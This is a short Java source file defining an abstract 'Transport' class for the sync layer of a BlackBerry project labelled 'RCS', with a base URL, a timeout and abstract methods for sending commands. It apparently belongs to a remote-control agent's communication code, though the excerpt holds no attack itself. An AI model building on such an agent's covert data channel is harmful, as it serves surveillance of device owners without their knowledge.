//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public abstract class Transport {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Transport", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    protected final int timeout = 120 * 1000;

    protected String baseurl;
    protected String suffix;

    public Transport(String baseurl) {
        //this.host = host;
        //this.port = port;
        this.baseurl = baseurl;
    }

    //#ifdef DEBUG
    public String toString() {
        return "Transport " + getUrl(); //$NON-NLS-1$
    }

    //#endif

    public abstract boolean isAvailable();

    public abstract byte[] command(byte[] data) throws TransportException;

    //public abstract void initConnectionUrl();
    protected abstract String getSuffix();

    public abstract void start();

    public abstract void close();

    public String getUrl() {
        // ConnectionSetup=delayed;UsePipe=true;
        return baseurl + Messages.getString("h.2") + timeout + getSuffix(); //$NON-NLS-1$
    }

}
